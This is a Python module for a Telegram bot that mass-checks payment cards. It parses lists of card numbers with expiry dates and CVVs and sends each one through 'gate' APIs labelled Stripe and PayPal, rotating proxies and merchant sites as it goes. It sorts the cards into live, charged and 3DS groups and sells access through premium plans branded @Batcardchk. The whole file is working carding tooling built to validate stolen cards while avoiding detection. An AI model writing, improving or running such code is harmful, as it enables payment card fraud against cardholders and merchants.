import aiohttp
import asyncio
import time
import re
import os
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes
from config import (
    API_TIMEOUT, get_bin_info, OWNER_ID, PREMIUM_GATES,
    GATE_URLS, GATE_SITES, CHANNEL_LINK, FORCE_CHANNELS
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MAX_CARDS       = 500
SEMAPHORE_LIMIT = 10

GATE_CONFIG = {
    "au":   {"name": "Sᴛʀɪᴘᴇ Aᴜᴛʜ"},
    "mss":  {"name": "Sᴛʀɪᴘᴇ Mᴀss"},
    "mpp2": {"name": "PᴀʏPᴀʟ Mᴀss"},
}

def load_list_from_file(filename: str, default_list: list) -> list:
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                items = [line.strip() for line in f if line.strip()]
                if items:
                    return items
        except Exception:
            pass
    return default_list

# CHANGED: proxies now load from px.txt
PROXIES = load_list_from_file("px.txt", [])
SITES   = load_list_from_file("sites.txt",   ["https://powerbuild.store"])

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD PARSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def parse_cards(text: str) -> list:
    cards = []
    for sep in ["\r\n", "\r", "\n", ";", ","]:
        text = text.replace(sep, "\n")
    for line in text.split("\n"):
        line = line.strip()
        if not line:
            continue
        parts = line.split("|")
        if len(parts) >= 4:
            card_num = re.sub(r"\s+", "", parts[0].strip())
            if re.search(r"\d{13,19}", card_num):
                cards.append(line)
            continue
        match = re.search(
            r"(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})", line
        )
        if match:
            cards.append(f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}")
            continue
        match = re.search(r"(\d{13,19})", line)
        if match:
            card_num  = match.group(1)
            remaining = line[match.end():].strip()
            if remaining:
                extra = re.findall(r"\d+", remaining)
                if len(extra) >= 3:
                    cards.append(f"{card_num}|{extra[0]}|{extra[1]}|{extra[2]}")
                else:
                    cards.append(card_num)
            else:
                cards.append(card_num)
    return cards

async def _download_file_cards(bot, file_id: str):
    try:
        file    = await bot.get_file(file_id)
        content = await file.download_as_bytearray()
        if content:
            try:
                return content.decode("utf-8", errors="ignore")
            except Exception:
                return content.decode("latin-1", errors="ignore")
        return None
    except Exception as e:
        print(f"[mass] File download error: {e}")
        return None

async def extract_cards_from_update(update: Update, bot, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if context.args:
        cards = parse_cards(" ".join(context.args))
        if cards:
            return cards
    if msg.document and msg.document.file_id:
        content = await _download_file_cards(bot, msg.document.file_id)
        if content:
            cards = parse_cards(content)
            if cards:
                return cards
        if msg.caption:
            caption = msg.caption.strip()
            for cmd in ("/au", "/mss", "/mpp2"):
                if caption.lower().startswith(cmd):
                    caption = caption[len(cmd):].strip()
                    break
            if caption:
                cards = parse_cards(caption)
                if cards:
                    return cards
    if msg.reply_to_message:
        replied = msg.reply_to_message
        if replied.text and replied.text.strip():
            cards = parse_cards(replied.text)
            if cards:
                return cards
        if replied.document and replied.document.file_id:
            content = await _download_file_cards(bot, replied.document.file_id)
            if content:
                cards = parse_cards(content)
                if cards:
                    return cards
    if msg.text and msg.text.strip() and not msg.text.startswith("/"):
        cards = parse_cards(msg.text)
        if cards:
            return cards
    return None

class ProxyRotator:
    def __init__(self, proxies: list):
        self.proxies = proxies
        self._index  = 0

    def next(self):
        if not self.proxies:
            return None
        proxy        = self.proxies[self._index % len(self.proxies)]
        self._index += 1
        return proxy

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CHECK CORE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def check_single_card(session, gate_key, api_url, site, card, proxy, semaphore):
    async with semaphore:
        try:
            if "{card}" in api_url:
                url = api_url.replace("{card}", card)
                async with session.get(url) as resp:
                    try:
                        data = await resp.json(content_type=None)
                    except Exception:
                        data = {"response": await resp.text(), "status": "false"}
            else:
                params = {"cc": card, "site": site}
                if proxy:
                    params["proxy"] = proxy
                async with session.get(api_url, params=params) as resp:
                    try:
                        data = await resp.json(content_type=None)
                    except Exception:
                        data = {"response": await resp.text(), "status": "false"}

            if not isinstance(data, dict):
                data = {"Response": str(data), "Status": "false"}

            response_text = str(
                data.get("Response") or data.get("response") or
                data.get("message") or "ERROR"
            ).strip()
            status     = str(data.get("Status") or data.get("status") or "false").lower()
            resp_lower = response_text.lower()

            if status == "true" or "approved" in resp_lower:
                card_status = "approved"
            elif "3ds" in resp_lower or "3d secure" in resp_lower:
                card_status = "3ds"
            elif "charged" in resp_lower or "captured" in resp_lower:
                card_status = "charged"
            else:
                card_status = "dead"

            return {
                "card": card, "response": response_text,
                "status": status, "card_status": card_status, "error": None,
            }
        except asyncio.TimeoutError:
            return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false", "card_status": "dead"}
        except Exception as e:
            return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false", "card_status": "dead"}

async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_key: str):
    cfg       = GATE_CONFIG[gate_key]
    gate_name = cfg["name"]
    user_id   = update.effective_user.id

    # ── Maintenance check ──
    if context.bot_data.get("maintenance") and user_id != OWNER_ID:
        await update.message.reply_text("⚠️ Bot is under maintenance."); return

    # ── Force subscribe check ──
    if user_id != OWNER_ID:
        not_joined = []
        for name, link in FORCE_CHANNELS:
            try:
                member = await context.bot.get_chat_member(f"@{name}", user_id)
                if member.status in ("left", "kicked"):
                    not_joined.append((name, link))
            except Exception:
                pass
        if not_joined:
            rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
            rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
            await update.message.reply_text(
                "<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n━━━━━━━━━━━━━━━━━\n"
                "Join channels to use mass check.\n━━━━━━━━━━━━━━━━━",
                reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML"
            )
            return

    # ── Premium check ──
    ud         = context.bot_data.get("user_data", {}).get(str(user_id), {})
    is_premium = (
        ud.get("plan", "TRIAL").upper() != "TRIAL"
        and ud.get("expires", 0) > time.time()
    )
    if not is_premium:
        await update.message.reply_text(
            "<b>⚠️ Pʀᴇᴍɪᴜᴍ Gᴀᴛᴇ</b>\n\n"
            "This gate is only for premium users.\nUpgrade: /plan",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")],
            ])
        )
        return

    # ── Extract cards ──
    cards = await extract_cards_from_update(update, context.bot, context)
    if not cards:
        await update.message.reply_text(
            f"⚠️ <b>Uꜱᴀɢᴇ:</b>\n\n"
            f"1️⃣ Reply to a .txt file and send <code>/{gate_key}</code>\n"
            f"2️⃣ Send a .txt file with <code>/{gate_key}</code> as caption\n"
            f"3️⃣ <code>/{gate_key} cc|mm|yy|cvv</code>",
            parse_mode="HTML"
        )
        return

    if len(cards) > MAX_CARDS:
        await update.message.reply_text(f"⚠️ Max {MAX_CARDS} cards per run.", parse_mode="HTML")
        return

    api_url = context.bot_data.get(f"gate_url_{gate_key}") or GATE_URLS.get(gate_key, "")
    site    = GATE_SITES.get(gate_key, "example.com")
    if not api_url:
        await update.message.reply_text("⚠️ Gate API not configured.", parse_mode="HTML")
        return

    # Load proxies and sites dynamically on each run
    dynamic_proxies = load_list_from_file("px.txt", PROXIES)
    dynamic_sites = load_list_from_file("sites.txt", SITES)

    rotator      = ProxyRotator(dynamic_proxies)
    sites_to_use = dynamic_sites if dynamic_sites else [site]

    msg = await update.message.reply_text(
        f"[₪] <b>Gᴀᴛᴇ</b> ➺ {gate_name}\n"
        f"━━━━━━━━━━━━━━\n"
        f"      [◈] <b>Sᴛᴀᴛᴜs</b> ➺ Sᴛᴀʀᴛɪɴɢ...\n"
        f"━━━━━━━━━━━━━━\n"
        f"📊 <b>Cᴀʀᴅꜱ</b> ➺ {len(cards)}\n"
        f"🌐 <b>Sɪᴛᴇs</b> ➺ {len(sites_to_use)}\n"
        f"━━━━━━━━━━━━━━\n"
        f"⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...",
        parse_mode="HTML"
    )

    semaphore  = asyncio.Semaphore(SEMAPHORE_LIMIT)
    start_time = time.time()

    connector = aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
    timeout   = aiohttp.ClientTimeout(total=max(API_TIMEOUT, 180))

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = [
            check_single_card(
                session, gate_key, api_url,
                sites_to_use[i % len(sites_to_use)],
                card, rotator.next(), semaphore
            )
            for i, card in enumerate(cards)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    parsed = [
        r if not isinstance(r, Exception)
        else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false", "card_status": "dead"}
        for r in results
    ]

    approved_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "approved"]
    charged_list  = [r for r in parsed if not r.get("error") and r.get("card_status") == "charged"]
    threeds_list  = [r for r in parsed if not r.get("error") and r.get("card_status") == "3ds"]
    dead_list     = [r for r in parsed if not r.get("error") and r.get("card_status") == "dead"]
    error_list    = [r for r in parsed if r.get("error")]
    elapsed       = time.time() - start_time

    # Store results for download buttons
    context.bot_data[f"mass_results_{user_id}_{gate_key}"] = {
        "parsed": parsed, "approved": approved_list, "charged": charged_list,
        "threeds": threeds_list, "dead": dead_list, "error": error_list,
        "gate": gate_name, "total": len(parsed), "gate_key": gate_key,
    }
    context.bot_data[f"last_mass_{user_id}"] = f"mass_results_{user_id}_{gate_key}"

    summary = (
        f"[₪] <b>Gᴀᴛᴇ</b> ➺ {gate_name}\n"
        f"━━━━━━━━━━━━━━\n"
        f"      [◈] <b>Sᴛᴀᴛᴜs</b> ➺ Fɪɴɪsʜᴇᴅ ✅\n"
        f"      [𖣸] <b>Cʜᴇᴄᴋᴇᴅ</b> ➺ {len(parsed)}/{len(cards)}\n"
        f"━━━━━━━━━━━━━━\n"
        f"♘ <b>Aᴘᴘʀᴏᴠᴇᴅ</b> ➺ {len(approved_list)} ✅\n"
        f"♞ <b>Cʜᴀʀɢᴇᴅ</b>  ➺ {len(charged_list)} 💎\n"
        f"🔐 <b>3Ds</b>      ➺ {len(threeds_list)}\n"
        f"❌ <b>Dᴇᴀᴅ</b>     ➺ {len(dead_list)}\n"
        f"⚠️ <b>Eʀʀᴏʀs</b>  ➺ {len(error_list)}\n"
        f"⏱ <b>Tɪᴍᴇ</b>    ➺ {elapsed:.0f}s\n"
        f"━━━━━━━━━━━━━━\n"
        f"📢 @Batcardchk"
    )
    await msg.edit_text(summary, parse_mode="HTML", reply_markup=_create_result_buttons())

def _create_result_buttons() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ LIVE",   callback_data="result_live"),
            InlineKeyboardButton("🔐 3DS",    callback_data="result_3ds"),
        ],
        [
            InlineKeyboardButton("💎 CHARGE", callback_data="result_charge"),
            InlineKeyboardButton("📦 ALL",    callback_data="result_all"),
        ],
    ])

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS COMMAND HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_au(update, context):   await process_mass(update, context, "au")
async def cmd_mss(update, context):  await process_mass(update, context, "mss")
async def cmd_mpp2(update, context): await process_mass(update, context, "mpp2")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS RESULT DOWNLOAD CALLBACK
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    user_id = query.from_user.id

    await query.answer("Generating file...", show_alert=False)

    result_key = context.bot_data.get(f"last_mass_{user_id}")
    if not result_key or result_key not in context.bot_data:
        await query.answer("⚠️ Results expired. Run the check again.", show_alert=True)
        return

    results  = context.bot_data[result_key]
    action   = query.data
    file_name = f"MASS_{user_id}.txt"

    if action == "result_all":
        parsed = results.get("parsed", [])
        if not parsed:
            await query.answer("No results found.", show_alert=True)
            return
        lines = []
        for r in parsed:
            card   = r.get("card", "N/A")
            status = r.get("card_status", "N/A").upper()
            resp   = r.get("error") if r.get("error") else r.get("response", "N/A")
            lines.append(f"Card: {card}\nStatus: {status}\nResponse: {resp}\n{'-'*30}")
        file_content = "\n".join(lines)
        caption  = f"📦 All Results ({len(parsed)} total) — @Batcardchk"
        file_name = f"ALL_{user_id}.txt"
        bio = BytesIO(file_content.encode("utf-8"))
        bio.name = file_name
        await context.bot.send_document(
            chat_id=query.message.chat_id, document=bio,
            filename=file_name, caption=caption
        )
        return

    if action == "result_live":
        cards_out = results.get("approved", [])
        caption   = f"✅ LIVE Cards ({len(cards_out)} found) — @Batcardchk"
        file_name = f"LIVE_{user_id}.txt"
    elif action == "result_3ds":
        cards_out = results.get("threeds", [])
        caption   = f"🔐 3DS Cards ({len(cards_out)} found) — @Batcardchk"
        file_name = f"3DS_{user_id}.txt"
    elif action == "result_charge":
        cards_out = results.get("charged", [])
        caption   = f"💎 Charged Cards ({len(cards_out)} found) — @Batcardchk"
        file_name = f"CHARGED_{user_id}.txt"
    else:
        return

    if not cards_out:
        await query.answer("No cards in this category.", show_alert=True)
        return

    file_content = "\n".join(r["card"] for r in cards_out)
    bio = BytesIO(file_content.encode("utf-8"))
    bio.name = file_name
    await context.bot.send_document(
        chat_id=query.message.chat_id, document=bio,
        filename=file_name, caption=caption
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EXPORT HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_mass_handlers():
    return [
        CommandHandler("au",   cmd_au),
        CommandHandler("mss",  cmd_mss),
        CommandHandler("mpp2", cmd_mpp2),
        CallbackQueryHandler(mass_callback_handler, pattern=r"^result_"),
    ]
